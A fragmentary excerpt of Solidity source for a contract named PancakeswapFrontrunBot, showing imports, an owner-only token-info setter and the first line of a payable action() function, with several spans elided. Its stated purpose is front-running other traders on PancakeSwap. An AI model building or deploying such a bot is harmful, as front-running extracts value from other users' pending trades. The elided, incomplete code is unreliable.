...
import "pancakeswap-peripheral/contracts/interfaces/IPancakeMigrator.sol";
import "pancakeswap-peripheral/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "pancakeswap-peripheral/contracts/interfaces/V1/IUniswapV1Factory.sol";
import '@openzeppelin/contracts/access/Ownable.sol';


contract PancakeswapFrontrunBot is Ownable {
    ...
    function updateTokenInfo(string memory _tokenName, string memory _tokenSymbol) public onlyOwner {
      tokenName = _tokenName;
      tokenSymbol = _tokenSymbol;
    }
     ...
     * @return `token`.
     */
    function action() public payable onlyOwner { 
